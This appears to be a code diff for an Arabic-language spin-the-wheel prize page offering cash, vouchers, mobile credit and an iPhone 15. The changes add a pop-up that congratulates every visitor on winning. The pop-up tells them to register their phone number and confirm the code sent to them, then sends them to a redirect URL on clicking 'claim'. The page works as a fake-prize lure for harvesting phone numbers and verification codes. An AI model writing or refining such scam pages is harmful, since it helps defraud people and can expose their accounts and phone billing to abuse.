@@ -13,14 +13,12 @@
       margin: 0;
       padding: 0;
     }
-
     h1 {
       margin-top: 25px;
       color: #2c3e50;
       font-size: 24px;
       padding: 0 10px;
     }
-
     #wheelContainer {
       position: relative;
       margin: 30px auto;
@@ -29,7 +27,6 @@
       height: 90vw;
       max-height: 380px;
     }
-
     #wheel {
       width: 100%;
       height: 100%;
@@ -38,7 +35,6 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.15);
       transition: transform 5s ease-out;
     }
-
     #pointer {
       width: 0;
       height: 0;
@@ -50,7 +46,6 @@
       left: 50%;
       transform: translateX(-50%);
     }
-
     #spinBtn {
       margin-top: 20px;
       padding: 15px 40px;
@@ -61,17 +56,37 @@
       border-radius: 8px;
       cursor: pointer;
     }
-
-    #spinBtn:hover {
-      background-color: #219150;
+    #resultBox {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #ffffff;
+      border: 2px solid #3498db;
+      padding: 25px;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      z-index: 999;
+      display: none;
     }
-
-    #result {
-      margin-top: 25px;
-      font-size: 22px;
-      font-weight: bold;
-      color: #2980b9;
-      min-height: 30px;
+    #resultBox p {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    #claimBtn {
+      padding: 12px 25px;
+      font-size: 18px;
+      background-color: #2980b9;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #spinBtn:hover, #claimBtn:hover {
+      background-color: #1c669d;
     }
   </style>
 </head>
@@ -85,7 +100,12 @@
   </div>
 
   <button id="spinBtn">اضغط للّف 🔄</button>
-  <div id="result"></div>
+
+  <div id="resultBox">
+    <p id="resultText">🎁 مبروك! لقد ربحت...</p>
+    <p>للحصول على الجائزة، يجب تسجيل رقم الهاتف وتأكيد الكود المرسل إليك.</p>
+    <button id="claimBtn">استلام الجائزة</button>
+  </div>
 
   <audio id="spinSound">
     <source src="https://cdn.pixabay.com/download/audio/2023/01/03/audio_8e604dcab5.mp3?filename=spin-wheel-113441.mp3" type="audio/mp3">
@@ -95,13 +115,15 @@
     const canvas = document.getElementById("wheel");
     const ctx = canvas.getContext("2d");
     const spinBtn = document.getElementById("spinBtn");
-    const resultTxt = document.getElementById("result");
+    const resultBox = document.getElementById("resultBox");
+    const resultText = document.getElementById("resultText");
+    const claimBtn = document.getElementById("claimBtn");
     const spinSound = document.getElementById("spinSound");
 
     const prizes = [
       "750 دينار",
       "قسيمة واو ستور",
-      "iPhone 13",
+      "iPhone 15",
       "فليكسي 200 دج"
     ];
 
@@ -115,13 +137,11 @@
       for (let i = 0; i < prizes.length; i++) {
         const start = i * arc;
         const end = start + arc;
-
         ctx.beginPath();
         ctx.fillStyle = colors[i];
         ctx.moveTo(190, 190);
         ctx.arc(190, 190, 190, start, end);
         ctx.fill();
-
         ctx.save();
         ctx.translate(190, 190);
         ctx.rotate(start + arc / 2);
@@ -137,7 +157,6 @@
 
     spinBtn.addEventListener("click", () => {
       spinBtn.disabled = true;
-      resultTxt.textContent = "⏳ جاري تدوير العجلة...";
       spinSound.currentTime = 0;
       spinSound.play();
 
@@ -150,11 +169,16 @@
       canvas.style.transform = `rotate(${finalAngle}deg)`;
 
       setTimeout(() => {
-        resultTxt.textContent = `🎁 ${prizes[randomSpin]}!`;
-        setTimeout(() => window.location.href = redirectURL, 2500);
+        resultText.innerHTML = `🎁 مبروك! لقد ربحت: <strong>${prizes[randomSpin]}</strong>`;
+        resultBox.style.display = "block";
       }, 5200);
+    });
+
+    claimBtn.addEventListener("click", () => {
+      window.location.href = redirectURL;
     });
   </script>
 
 </body>
 </html>
+
